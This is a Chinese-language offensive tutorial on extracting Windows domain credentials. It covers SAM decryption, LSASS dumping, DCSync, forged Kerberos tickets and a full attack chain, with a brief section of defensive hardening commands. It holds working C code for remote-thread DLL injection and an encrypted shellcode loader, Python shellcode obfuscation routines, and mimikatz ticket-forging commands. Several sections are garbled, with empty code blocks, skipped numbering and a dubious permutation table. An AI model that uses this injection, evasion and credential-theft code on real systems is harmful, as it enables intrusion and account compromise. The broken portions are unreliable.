# 域凭证提取技术

## 概述

域凭证提取是内网渗透中的关键技术，目标是从 Windows 域环境中获取用户凭证（NTLM哈希、Kerberos票据、明文密码等），用于横向移动和权限维持。

攻击者可利用提取的凭证进行：
- 横向移动（Pass-the-Hash、Pass-the-Ticket）
- 权限提升（提取域管凭证）
- 持久化（创建隐藏账户、黄金票据）
- 数据窃取（解密加密数据）

## 一、本地凭证提取

### 1.1 SAM 和 SECURITY 注册表解密

Windows 本地账户的哈希存储在注册表中：
- **SAM** (Security Account Manager): 存储用户账户的哈希值
- **SECURITY**: 存储加密密钥（Boot Key/SYSKEY）

#### 1.1.1 存储结构

```
HKLM\SAM\SAM\Domains\Account\Users
├── Names\          # 用户名到RID的映射
│   ├── Administrator -> 0x1F4
│   ├── Guest -> 0x1F5
│   └── ...
└── %RID%\          # 用户账户数据（十六进制RID）
    └── F           # 特征数据（用户名标志等）
    └── V           # 包含加密的哈希数据（关键载荷）
```

**V 值结构（关键载荷）：**
```
偏移 0x00: 加密的 NTLM Hash（16字节）
偏移 0x10: 加密的 LM Hash（16字节）
偏移 0x60: NTLM Hash 历史（最多 24 组，用于密码历史）
偏移 0xC0: LM Hash 历史
```

#### 1.1.2 解密流程

```
1. 获取 SYSKEY (Boot Key)
   - 位于 HKLM\SYSTEM\CurrentControlSet\Control\Lsa
   - 由 4 个注册表值拼接而成: {JD, Skew1, GBG, Data}
   - 每个值取前 8 字节，共 32 字节
   - 通过特定排列算法（Scrambler Key/Key Permutation）得到 16 字节 Boot Key
   
   SYSKEY 计算步骤：
   a) 读取 JD, Skew1, GBG, Data 各取 8 字节 → 32 字节原始数据
   b) 使用 Scrambler Key (32字节排列表) 重排
   c) 对结果应用 DES-CBC 解密 → 得到 16 字节 SYSKEY

2. 获取 SAM 数据库加密密钥
   a) 从 HKLM\SECURITY\Policy\PolEKList 读取加密的密钥
   b) 使用 SYSKEY + RC4 解密得到 AES Key/DES Key
   c) 从 SECURITY 的 LSA Key 数据解密 → 得到 SAM 解密密钥

3. 解密用户哈希
   a) 读取 SAM 中每个用户的 V 值
   b) 使用 SAM 密钥对 V 值进行 RC4/DES 解密
   c) 得到 NTLM Hash（MD4(unicode(password))）和 LM Hash
```

**SYSKEY 排列算法（Scrambler Key）：**

SYSKEY 的 4 个分量（JD, Skew1, GBG, Data）在注册表中存储的位置并非直接按序排列，而是使用了一个固定的字节置换表。Windows 或版本不同，置换表有所不同：

```python
# 简化的 SYSKEY 计算逻辑
def compute_boot_key(jd, skew1, gbg, data):
    # 4 个分量各取 8 字节
    raw = jd[:8] + skew1[:8] + gbg[:8] + data[:8]  # 32 字节
    
    # 使用 Scrambler Key 重排
    scrambler = [
        0x08, 0x24, 0x18, 0x0C, 0x00, 0x04, 0x20, 0x10,
        0x02, 0x06, 0x12, 0x1C, 0x0A, 0x0E, 0x16, 0x14,
        0x01, 0x05, 0x1A, 0x1E, 0x09, 0x0D, 0x22, 0x00,
        0x03, 0x07, 0x0B, 0x0F, 0x11, 0x13, 0x15, 0x17
    ]
    
    boot_key = bytes([raw[i] for i in scrambler])
    return boot_key
```

```
HKLM\SAM\SAM\Domains\Account
├── F              # 域描述符（固定数据）
└── V              # 用户列表和加密密钥
    ├── ...        # RC4 加密的哈希表
    └── ...        # LM/NTLM Hash 历史记录
```

#### 1.1.5 LM 哈希与 NTLM 哈希的关系

```
LM Hash（旧版，弱）：
  - 密码转大写 → 填充到 14 字节 → 分成 2 个 7 字节
  - 每个 7 字节作为 DES 密钥加密 "KGS!@#$%"
  - 优点：快速，兼容性
  - 弱点：无大小写、7字节分组可分别爆破
  
NTLM Hash（现版，强）：
  - MD4(UTF-16-LE(password))
  - 固定 16 字节长度
  - 弱点：仍可离线爆破（Hashcat 每秒数十亿次）
```

### 1.2 LSASS 内存转储

LSASS (Local Security Authority Subsystem Service) 进程内存中缓存了大量凭证信息。

#### 1.2.1 LSASS 缓存的凭证类型

| 凭证类型 | 说明 | 获取方法 |
|---------|------|---------|
| NTLM Hash | 用户密码的 NTLM 哈希 | sekurlsa::logonpasswords |
| Kerberos Tickets | TGT 和 TGS 票据 | sekurlsa::tickets |
| Clear-text Password | 明文密码（WDigest、SSP） | sekurlsa::logonpasswords |
| DPAPI Keys | 用于解密用户加密数据 | sekurlsa::dpapi |
| LSA Secrets | 服务账户密码等 | lsadump::lsa /patch |
| WDigest | 已弃用的明文存储 | 需启用注册表值 |

### 1.3 绕过杀毒软件的技术

#### 1.3.1 白加黑 DLL 加载

原理：利用合法（白）程序加载恶意 DLL（黑），绕过静态检测和文件扫描。

**实现方式一：DLL 劫持（DLL Hijacking）**
```
1. 使用 Process Monitor 监控目标程序加载了哪些 DLL
2. 找到优先搜索当前目录的 DLL（不在系统路径中）
3. 将恶意 DLL 命名为被劫持的 DLL 名称
4. 放置在白程序同目录
5. 执行白程序，自动加载恶意 DLL
```

**常见可劫持程序：**
- `svchost.exe`（各种服务宿主）
- `explorer.exe`（资源管理器）
- 各种杀软白名单程序（腾讯/阿里/360 的工具）
- 常用办公软件（WPS、Office）
- 系统工具（notepad.exe、mspaint.exe）

**实现方式二：DLL 侧加载（DLL Side-Loading）**
```
1. 找到白程序中通过 LoadLibrary 加载但不指定绝对路径的 DLL
2. 利用 Windows DLL 搜索顺序（当前目录 → System32 → PATH）
3. 将恶意 DLL 放在当前目录，优先于系统目录加载
```

**Windows DLL 搜索顺序：**
```
1. 程序所在目录
2. 系统目录（C:\Windows\System32）
3. 16位系统目录（C:\Windows\System）
4. Windows 目录（C:\Windows）
5. 当前工作目录
6. PATH 环境变量中的目录
```

**实现方式三：DLL 注入（远程线程注入）**
```c
#include <windows.h>
#include <tlhelp32.h>

DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    LPVOID pRemoteDll = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                        MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteDll, dllPath, strlen(dllPath) + 1, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteDll, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    VirtualFreeEx(hProcess, pRemoteDll, strlen(dllPath) + 1, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    DWORD pid = FindProcessId("explorer.exe");
    if (pid) {
        InjectDLL(pid, "C:\\temp\\malicious.dll");
    }
    return 0;
}
```

#### 1.3.2 Mimikatz Shellcode 分离

将 mimikatz 的核心功能编译为独立的 shellcode，通过加载器在内存中解密执行，避免文件扫描。

**分离步骤：**

```
步骤 1: 修改 mimikatz 源码，提取核心功能
步骤 2: 使用特定编译选项生成 shellcode（位置无关代码）
步骤 3: 对 shellcode 进行加密/编码（XOR、AES、RC4）
步骤 4: 开发加载器（加载器可以是任何语言）
步骤 5: 加载器运行时：解密 → 分配内存 → 执行
```

**加载器类型对比：**

| 加载器类型 | 语言 | 优点 | 缺点 |
|-----------|------|------|------|
| 原生 | C/C++ | 性能最好，控制力强 | PE 特征明显 |
| 托管 | C#/PowerShell | 与 .NET 环境集成 | 需 .NET 运行时 |
| PowerShell | PowerShell | 无文件落地，可内存执行 | 被 AMSI 监控 |
| 宏 | VBA | 通过 Office 文档分发 | 宏检测严格 |
| JS/WSF | JScript | .sct 文件绕过 | 功能受限 |

**C 加载器示例（支持加密）：**
```c
#include <windows.h>

// AES 加密的 shellcode
unsigned char encrypted_shellcode[] = {0x...};
unsigned char key[] = "16_byte_aes_key!!";
int shellcode_len = sizeof(encrypted_shellcode);

// XOR 解密
void xor_decrypt(unsigned char* data, int len, unsigned char* key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % 16];
    }
}

// Syscall 直接调用（绕过 Hook）
void execute_shellcode(unsigned char* shellcode, SIZE_T size) {
    // 1. 分配可执行内存
    void* exec = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, 
                              PAGE_READWRITE);
    
    // 2. 复制解密后的 shellcode
    memcpy(exec, shellcode, size);
    
    // 3. 修改为可执行权限
    DWORD old_protect;
    VirtualProtect(exec, size, PAGE_EXECUTE_READ, &old_protect);
    
    // 4. 执行 shellcode
    ((void(*)())exec)();
}

int main() {
    // 解密
    xor_decrypt(encrypted_shellcode, shellcode_len, key);
    // 执行
    execute_shellcode(encrypted_shellcode, shellcode_len);
    return 0;
}
```

**加密混淆方案（多层绕过）：**
```python
import base64
from Crypto.Cipher import AES

# 方案1: XOR + Base64
def xor_base64(shellcode, key):
    xored = bytes([b ^ key[i % len(key)] for i, b in enumerate(shellcode)])
    return base64.b64encode(xored)

# 方案2: AES-CBC + Base64
def aes_encrypt(shellcode, aes_key, iv):
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    # PKCS7 填充
    pad_len = 16 - (len(shellcode) % 16)
    shellcode_padded = shellcode + bytes([pad_len] * pad_len)
    encrypted = cipher.encrypt(shellcode_padded)
    return base64.b64encode(encrypted)

# 方案3: RC4 加密
def rc4_encrypt(shellcode, key):
    # RC4 流密码，适合 shellcode 加密
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    result = []
    i = j = 0
    for byte in shellcode:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        result.append(byte ^ K)
    return bytes(result)
```

#### 1.3.3 常见免杀技术总结

| 技术 | 原理 | 绕过检测类型 | 注意事项 |
|-----|------|-------------|---------|
| 代码混淆 | 混淆恶意特征字符串/API名 | 静态检测 | 不影响运行时逻辑 |

| 分离加载 | shellcode 与加载器分离存储 | 文件熵检测 | 需要额外分发 |

| 间接系统调用 | 通过非受信进程的 ntdll 调用 | 内核回调检测 | 兼容性更好 |
| API 哈希化 | 使用哈希代替字符串搜索 API | 字符串检测 | 需要哈希算法实现 |
| 延迟执行 | 插入无用循环延迟行为 | 行为分析 | 对抗沙箱超时 |
| 环境检测 | 检测 VM/沙箱/调试器特征 | 沙箱检测 | 不同环境特征各异 |
| 数字签名伪装 | 伪造或窃取签名 | 文件信誉检测 | 签名验证会更严格 |
| 反射加载 | 在内存中自行解析 PE 加载 | 文件落地检测 | 实现复杂 |
| 进程镂空 | 创建傀儡进程替换内存 | 进程白名单 | 需注意原进程特征 |

### 2.2 DCSync 攻击

DCSync 是一种模拟域控制器复制行为的技术，利用 MS-DRSR（Directory Replication Service）协议，无需登录域控制器或直接访问 NTDS.DIT 即可获取域内所有哈希。

#### 2.2.1 原理（DRSUAPI 协议细节）

```
1. 攻击者模拟域控制器行为
2. 向目标 DC 发送 MS-DRSR 复制请求
3. 使用 DRSUAPI RPC 接口的 DRSGetNCChanges 方法
4. 请求 Naming Context 的复制数据
5. DC 返回包含账户哈希的复制数据
6. 解析二进制数据，提取 NTLM/Kerberos 哈希
```

**DRSGetNCChanges 调用流程：**
```
攻击者 → DRSGetNCChanges(DREP_MSG_GETNCCHANGES_REQ)
  ├── Bind to DRSUAPI (RPC over TCP: 135 → port dynamic)
  ├── Bind to NTDS via NC (Naming Context)
  ├── DRSGetNCChanges request
  │   ├── uuidDsaBind (绑定源 DC)
  │   ├── dcReplicaSync (同步请求)
  │   └── drsGetNCChanges (获取变更)
  └── Response contains:
      ├── Directory changes
      ├── Encrypted NTLM/LM hashes (以 PEK 方式加密)
      └── Replication metadata
```

**哈希加密方式（PEK - Password Encryption Key）：**
```
NTDS.DIT 中的哈希并非明文，而是多层加密：
1. PEK (Password Encryption Key) 存储在 NTDS 中
2. PEK 被 SYSKEY (Boot Key) 加密
3. SYSKEY 来自 SYSTEM hive
4. 解密时: SYSTEM → SYSKEY → PEK → Decrypt Hashes
```

#### 2.2.2 所需权限

DCSync 需要以下特权之一：
- Domain Admins（域管理员）
- Enterprise Admins（企业管理员）
- DC 本地 Administrators（域控管理员）
- 特定复制权限：
  - `DS-Replication-Get-Changes` (扩展权)
  - `DS-Replication-Get-Changes-All` (扩展权)
  - `DS-Replication-Get-Changes-In-Filtered-Set` (扩展权，可选)

### 3.5 Kerberos 票据操作

#### 3.5.1 Kerberos 基础

```
Kerberos 认证流程：
┌──────┐    AS-REQ       ┌──────┐
│      │ ───────────────→ │      │
│ Client│                 │  KDC  │
│      │ ←─────────────── │  (DC) │
│      │    AS-REP (TGT)  │      │
│      │                 │      │
│      │    TGS-REQ      │      │
│      │ ───────────────→ │      │
│      │ ←─────────────── │      │
│      │   TGS-REP (TGS)  │      │
│      │                 │      │
│      │    AP-REQ (TGS) │      │
│      │ ───────────────→ │Server│
│      │ ←─────────────── │      │
│      │   AP-REP (Auth)  │      │
└──────┘                 └──────┘
```

#### 3.5.2 Kerberos 票据类型

| 票据类型 | 用途 | 有效期 | 关键点 |
|---------|------|--------|--------|
| TGT | 身份证明票据 | 默认10小时 | 需要 KRBTGT Hash |
| TGS | 服务访问票据 | 取决于服务 | 服务 NTLM Hash |
| Silver Ticket | 伪造的 TGS | 自定义 | 服务 NTLM Hash |
| Golden Ticket | 伪造的 TGT | 自定义 | KRBTGT NTLM Hash |
| Diamond Ticket | 修改的 TGT | 自定义 | 解码后重加密 |
| Sapphire Ticket | 加密的 TGT | 自定义 | 基于 KrbFastArmoredReq |

#### 3.5.3 票据操作命令

```powershell
# 票据提取与查看
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::tickets /export

# 查看当前票据
klist
klist tickets
klist sessions

# 票据传递 - Pass-the-Ticket (PtT)
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # kerberos::ptt C:\temp\admin_tgt.kirbi

# 票据清除

mimikatz # kerberos::purge
```

#### 3.5.4 白银票据 (Silver Ticket)

白银票据是伪造的服务票据（TGS），用于访问特定服务。

```
特点：
- 不需要与 DC 通信
- 只需要目标服务的 NTLM Hash
- 可以访问特定的服务（CIFS/HOST/HTTP/LDAP 等）
- 不修改 TGS，不产生 TGS-REQ 日志
```

```powershell
# 获取服务 Hash（需要目标机器的管理员权限或 DC 权限）
mimikatz # sekurlsa::logonpasswords

# 创建白银票据
mimikatz # kerberos::golden /domain:contoso.com /sid:S-1-5-21-xxx /target:dc01.contoso.com /service:CIFS /rc4:service_ntlm_hash /user:Administrator /ptt

# 测试访问
dir \\dc01\C$

# 常用服务
/service:CIFS       # 文件共享访问
/service:HOST        # 计划任务、WMI
/service:HTTP        # Web 服务
/service:LDAP        # LDAP 查询
/service:WINRM       # WinRM
/service:TIME         # 时间同步
/service:RPCSS       # RPC

# 白银票据限制
# 1. 只能访问特定服务
# 2. 需要服务的 NTLM Hash
# 3. 不包含 PAC 验证
```

#### 3.5.5 黄金票据 (Golden Ticket)

黄金票据是伪造的 TGT，可以访问域内任何资源。

```
特点：
- 需要 KRBTGT 账户的 NTLM Hash
- 完全域管理员权限
- 可以伪造任意用户
- 有效期可自定义（默认 10年）
- 不需要与 DC 通信
```

```powershell
# 获取 KRBTGT Hash（需要 DCSync 权限）

# 创建黄金票据

# /id:500         # RID Administrator
# /groups:512     # Domain Admins
# /groups:513     # Domain Users
# /groups:518     # Schema Admins
# /groups:519     # Enterprise Admins
# /groups:520     # Group Policy Creator Owners
```

#### 3.5.6 钻石票据 (Diamond Ticket)

钻石票据是修改现有的 TGT（而非伪造），更隐蔽。

```
流程：
1. 请求一个合法的 TGT（使用普通域用户）
2. 解码 TGT 数据
3. 修改 PAC 中的用户信息（提升为域管）
4. 使用 KRBTGT Hash 重新加密
5. 注入到当前会话
```

```powershell

```

### 5.2 防御措施分层

```
第一层：平台加固
├── 启用 Credential Guard（Windows 10/Server 2016+）
├── 启用 LSASS 为 PPL 进程
├── 禁用 WDigest 认证
├── 限制 NTLM 使用（NTLM Audit）
├── 配置 Protected Users 安全组
└── 启用 Windows Defender Credential Guard

第二层：权限管理
├── 实施最小权限原则
├── 使用 Tiered Administration 模型
│   ├── Tier 0: 身份管理（域控、CA、AD）
│   ├── Tier 1: 服务器管理
│   └── Tier 2: 工作站管理
├── 限制特权组数量
├── 分离管理员账户（普通用户/管理用户分离）
└── 实施 JIT (Just-In-Time) 权限提升

第三层：监控与检测
├── 启用高级安全审计策略
├── 部署 EDR/SIEM
├── 配置自定义检测规则
├── 实施 UEBA 行为分析
└── 定期红蓝对抗评估

第四层：应急响应
├── 凭证轮换计划（紧急情况下）
├── KRBTGT 密码定期重置
├── 域管密码定期轮换
├── 服务账户密码管理
└── 事件响应预案
```

### 5.3 Windows 事件日志配置

```powershell
# 启用详细审计策略
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Other Account Logon Events" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# 启用进程创建审计（包含命令行）
auditpol /set /subcategory:"Process Creation" /success:enable
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine /t REG_DWORD /d 1 /f

# 启用 LSASS 进程访问审计
auditpol /set /subcategory:"Detailed File Share" /success:enable

# 查看当前审计策略
auditpol /get /category:*
```

### 5.4 关键防御命令

```powershell
# 检查 Credential Guard 是否启用
Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -Class Win32_DeviceGuard
# 检查 Run in Isolated Mode 是否为 True

# 检查 LSASS PPL 状态
Get-CimInstance -Namespace root\Microsoft\Windows\Security -Class Win32_LSA

# 检查 WDigest 状态

# 检查缓存凭据数量

# 设置 Protected Users 组（重要！）
# 将高权限账户加入该组

# 设置 NTLM 审计模式
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 /v NtlmMinClientSec /t REG_DWORD /d 537395200 /f
```

### 6.1 完整攻击链

```
第一阶段：初始访问
├── 钓鱼获得初始凭据

└── 外部暴露服务漏洞

├── whoami, net localgroup administrators

└── 本地凭证提取: LaZagne, mimikatz

第三阶段：横向移动
├── Pass-the-Hash: 使用 NTLM Hash 访问其他机器
├── Pass-the-Ticket: 使用 TGT/TGS 票据
├── Overpass-the-Hash: RC4/AES Key → TGT
├── WMI/PSExec/WinRM 远程执行
├── SMB 共享访问
└── RDP 横向

第四阶段：权限提升
├── 本地提权漏洞利用
├── GPO 滥用
├── ACL 滥用（修改用户组）
├── AD CS 漏洞（ESC1-ESC13）
└── 域管理权限获取

第五阶段：域控攻陷
├── DCSync 提取全部哈希
├── NTDS.DIT 导出
├── Skeleton Key 后门
├── DSRM 密码同步利用
├── DCShadow 隐藏域控

第六阶段：权限维持与数据窃取
├── 黄金/白银票据
├── SSP 注入
├── 计划任务后门
├── 服务后门
├── 组策略后门
└── SID History 注入
```

### 6.2 常见 AD 攻击路径

```mermaid
攻击路径示例：
用户A (标准用户) 
  ├── ACL: 有 GenericAll 权限 → 用户B
  │   └── 用户B 是 Group-X 的成员
  │       └── Group-X 有 WriteOwner 权限 → Group-Y
  │           └── Group-Y 是 Domain Admins 的成员
  │               └── 目标达成！
  │
  ├── 用户A 可以在 Server01 上创建计划任务

  │           └── DCSync → 域管权限
  │
  └── 用户A 可以登录到 Workstation01
      └── Workstation01 上缓存了管理员凭据
          └── LSASS dump → 域管 Hash
```
